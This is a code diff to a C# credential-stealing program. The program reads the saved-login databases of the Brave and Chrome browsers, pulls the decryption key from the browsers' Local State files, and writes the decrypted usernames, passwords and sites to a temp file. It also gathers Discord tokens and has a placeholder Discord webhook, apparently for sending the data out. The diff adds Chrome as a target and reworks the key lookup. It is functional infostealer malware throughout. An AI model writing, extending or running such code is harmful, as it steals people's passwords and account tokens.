@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Linq;
 using System.Collections.Generic;
@@ -22,18 +22,20 @@ namespace ConsoleApp1
     class Program
     {
         public static string Webhook_link = ""; //Webhook Link
+        
         public static void Main(string[] args)
         {
             Directory.CreateDirectory(Path.GetTempPath() + "INZ");
 
             string[] paths = {
                
-                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Google\Chrome\User Data\default\Login Data"
             };
             string pwd_text = "";
 
             foreach (string p in paths)
-            {
+            {   
                 var pas = Passwords.ReadPass(p);
                 if (File.Exists(p))
                 {
@@ -62,7 +64,7 @@ namespace ConsoleApp1
 
 
             string FilePath = TempPath + "/INZ/Passwords.txt";
-
+            System.Diagnostics.Process.Start(FilePath); 
 
             var tokens = DiscordG.Program.GetThem();
             if (tokens.Count > 0)
@@ -85,16 +87,15 @@ namespace ConsoleApp1
                 {
                     File.Delete(Path.GetTempPath() + @"INZ\Login Data");
                 }
-                File.Copy(dbPath, Path.GetTempPath() + @"INZ\Login Data");
-                dbPath = Path.GetTempPath() + @"INZ\Login Data";
-                var connectionString = "Data Source=" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Default\Login Data" + ";pooling=false";
+                byte[] key = AesGcm256.GetKey(dbPath);
+                var connectionString = "Data Source=" + dbPath + ";pooling=false";
                 using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
                 using (var cmd = conn.CreateCommand())
                 {
 
 
                     cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
-                    byte[] key = AesGcm256.GetKey();
+                    
                     conn.Open();
 
                     using (var reader = cmd.ExecuteReader())
@@ -126,9 +127,18 @@ namespace ConsoleApp1
 }
 class AesGcm256
 {
-    public static byte[] GetKey()
+    
+
+    public static byte[] GetKey(string dbpath)
     {
-        string path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State";
+        string path = "";
+        if (dbpath.Contains("Brave-Browser"))
+        {
+            path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State";
+        } else if (dbpath.Contains("Chrome"))
+        {
+            path = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Local State";
+        }
 
         string v = File.ReadAllText(path);
 
